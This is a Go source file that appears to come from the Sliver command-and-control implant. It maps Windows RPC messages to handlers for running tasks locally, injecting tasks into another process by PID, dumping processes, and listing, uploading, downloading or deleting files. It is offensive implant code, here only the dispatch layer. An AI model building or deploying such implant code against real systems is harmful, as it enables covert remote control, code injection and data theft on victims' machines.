package handlers

import (
	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	pb "sliver/protobuf/sliver"
	"sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		// Windows Only
		pb.MsgTask:           taskHandler,
		pb.MsgRemoteTask:     remoteTaskHandler,
		pb.MsgProcessDumpReq: dumpHandler,

		// Generic
		pb.MsgPsListReq:   psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgKill:        killHandler,
		pb.MsgLsReq:       dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
	}
)

func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// ---------------- Windows Handlers ----------------

func taskHandler(data []byte, resp RPCResponse) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	err = taskrunner.LocalTask(task.Data)
	resp([]byte{}, err)
}

func remoteTaskHandler(data []byte, resp RPCResponse) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
	resp([]byte{}, err)
}